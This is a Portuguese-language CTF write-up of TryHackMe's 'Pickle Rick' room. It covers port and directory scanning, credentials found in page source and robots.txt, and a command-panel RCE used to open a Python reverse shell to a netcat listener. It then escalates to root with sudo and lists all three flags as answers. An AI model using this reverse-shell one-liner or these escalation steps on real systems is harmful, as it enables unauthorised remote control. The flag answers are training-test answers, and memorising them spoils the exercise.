CTF PICLE RICK
 
Ao inicar o desafio dei um nmap para ver as portas abertas

    nmap -A -sV IP

Encontrei 2 portas(22,80)

Ao entrar no servidor apache vizualizei o codigo fonte e encontrei uma mensagem informando o username 

    R1ckRul3s

Apos isso dei um gosbuster para encontrar diretorios desse apache

    gobuster dir -u IP -w directory-list-2.3-small.txt -x php,html,txt

    /robots.txt
    /assets
    /index.html
    /login.php
    /portal.php

Ao procurar esses diretorios no robots.txt tinha uma palavra que poderia ser uma senha 

    Wubbalubbadubdub

No login.php coloquei o username(R1ckRul3s) e o password(Wubbalubbadubdub) assim acessando o portal.php 

O comando "ls" nao podia ser usado entao era possivel usar o "less"

Assim...

    less clue.txt

    Look around the file system for the other ingredient.

Depois...

    less Sup3rS3cretPick13Ingred.txt

    mr. meeseek hair

Encontrando a primeira flag do CTF

Agora teremos que entrar no sistema como foi dito na dica, para entrar no sistema usamos a falha RCE que permite voce executar um codigo malicioso no back-end da aplicacao... ao buscar python no command panel vimos que tinha um python3 instalado

    which python3

Assim era so criar no netcat e pegar o script 

Script 

    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP(tryhackme)",1333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

NetCat

    nc -lvnp 1333

Ao conseguir entrar no sistema fui procurar arquivos no sistema ao encontrar no /home

    cd /home
    cd rick

    cat "second ingredients"
    1 jerry tear 

Encontrando a segunda flag era so ir atras da ultima..
Ao ver as permissoes root do usuario vi que nosso usuario podia executar tudo como root

    sudo -l

Assim...

    sudo bash -i
    cd /root
    cat 3rd.txt
    fleeb juice 

E conseguindo todas as flags..

FLAGS

    Flag 1: mr. meeseek hair
    Flag 2: 1 jerry tear
    Flag 3: fleeb juice